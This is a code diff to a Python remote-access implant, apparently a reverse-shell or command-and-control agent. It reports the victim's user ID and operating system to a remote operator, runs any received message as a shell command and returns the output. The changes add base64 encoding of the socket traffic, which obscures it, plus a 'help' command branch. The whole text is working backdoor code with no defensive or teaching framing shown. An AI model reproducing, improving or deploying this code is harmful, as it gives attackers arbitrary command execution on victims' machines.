@@ -1,8 +1,9 @@
+import base64
+import os
+import platform
+import pwd
 import socket
 import subprocess
-import os
-import pwd
-import platform
 import time
 
 
@@ -14,7 +15,7 @@ def session_handler(sock, target_ip, target_port):
         outbound(sock, os.getuid())
         time.sleep(1)
         op_sys = platform.uname()
-        op_sys =(f'{op_sys[0]} {op_sys[2]}')
+        op_sys = (f'{op_sys[0]} {op_sys[2]}')
         outbound(sock, op_sys)
         print(f'[+] Connected to {target_ip}.')
         while True:
@@ -38,6 +39,8 @@ def session_handler(sock, target_ip, target_port):
                     continue
             elif message == 'background':
                 pass
+            elif message == 'help':
+                pass
             else:
                 command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 output = command.stdout.read() + command.stderr.read()
@@ -59,13 +62,15 @@ def inbound(sock):
     while True:
         try:
             message = sock.recv(1024).decode()
+            message = base64.b64decode(message).decode().strip()
             return message
         except Exception:
             sock.close()
 
 
 def outbound(sock, message):
-    response = str(message).encode()
+    response = str(message)
+    response = base64.b64encode(bytes(response, encoding='utf-8'))
     sock.send(response)
     return
 
